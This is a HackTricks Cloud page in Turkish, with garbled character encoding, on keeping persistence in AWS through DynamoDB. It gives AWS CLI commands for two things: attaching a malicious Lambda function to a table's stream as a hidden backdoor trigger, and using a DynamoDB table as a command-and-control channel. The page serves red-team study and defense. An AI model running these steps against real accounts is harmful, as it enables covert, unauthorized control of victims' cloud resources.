# AWS - DynamoDB SÃ¼rekliliÄŸi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### DynamoDB

Daha fazla bilgiye eriÅŸim:

{% content-ref url="../aws-services/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-dynamodb-enum.md)
{% endcontent-ref %}

### Lambda Arka KapÄ±sÄ± ile DynamoDB Tetikleyicileri

DynamoDB tetikleyicilerini kullanarak, bir saldÄ±rgan bir tabloyla kÃ¶tÃ¼ niyetli bir Lambda iÅŸlevini iliÅŸkilendirerek **gizli bir arka kapÄ±** oluÅŸturabilir. Lambda iÅŸlevi, bir Ã¶ÄŸe eklendiÄŸinde, deÄŸiÅŸtirildiÄŸinde veya silindiÄŸinde tetiklenebilir, bu da saldÄ±rgana AWS hesabÄ± iÃ§inde rastgele kod Ã§alÄ±ÅŸtÄ±rma imkanÄ± tanÄ±r.

{% code overflow="wrap" %}
```bash
# Create a malicious Lambda function
aws lambda create-function \
--function-name MaliciousFunction \
--runtime nodejs14.x \
--role <LAMBDA_ROLE_ARN> \
--handler index.handler \
--zip-file fileb://malicious_function.zip \
--region <region>

# Associate the Lambda function with the DynamoDB table as a trigger
aws dynamodbstreams describe-stream \
--table-name TargetTable \
--region <region>

# Note the "StreamArn" from the output
aws lambda create-event-source-mapping \
--function-name MaliciousFunction \
--event-source <STREAM_ARN> \
--region <region>
```
{% endcode %}

KalÄ±cÄ±lÄ±ÄŸÄ± sÃ¼rdÃ¼rmek iÃ§in, saldÄ±rgan DynamoDB tablosunda Ã¶ÄŸeler oluÅŸturabilir veya bunlarÄ± deÄŸiÅŸtirebilir, bu da kÃ¶tÃ¼ niyetli Lambda iÅŸlevini tetikler. Bu, saldÄ±rgana Lambda iÅŸleviyle doÄŸrudan etkileÅŸim olmadan AWS hesabÄ± iÃ§inde kod Ã§alÄ±ÅŸtÄ±rma imkanÄ± tanÄ±r.

### DynamoDB C2 KanalÄ± Olarak

Bir saldÄ±rgan, komutlar iÃ§eren Ã¶ÄŸeler oluÅŸturarak ve bu komutlarÄ± almak ve yÃ¼rÃ¼tmek iÃ§in ele geÃ§irilmiÅŸ Ã¶rnekler veya Lambda iÅŸlevleri kullanarak bir DynamoDB tablosunu **komut ve kontrol (C2) kanalÄ±** olarak kullanabilir.
```bash
# Create a DynamoDB table for C2
aws dynamodb create-table \
--table-name C2Table \
--attribute-definitions AttributeName=CommandId,AttributeType=S \
--key-schema AttributeName=CommandId,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--region <region>

# Insert a command into the table
aws dynamodb put-item \
--table-name C2Table \
--item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
--region <region>
```
Kompromize edilmiÅŸ Ã¶rnekler veya Lambda fonksiyonlarÄ±, yeni komutlar iÃ§in C2 tablosunu periyodik olarak kontrol edebilir, bunlarÄ± Ã§alÄ±ÅŸtÄ±rabilir ve isteÄŸe baÄŸlÄ± olarak sonuÃ§larÄ± tabloya geri raporlayabilir. Bu, saldÄ±rganÄ±n, ele geÃ§irilmiÅŸ kaynaklar Ã¼zerinde kalÄ±cÄ±lÄ±k ve kontrol saÄŸlamasÄ±na olanak tanÄ±r.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
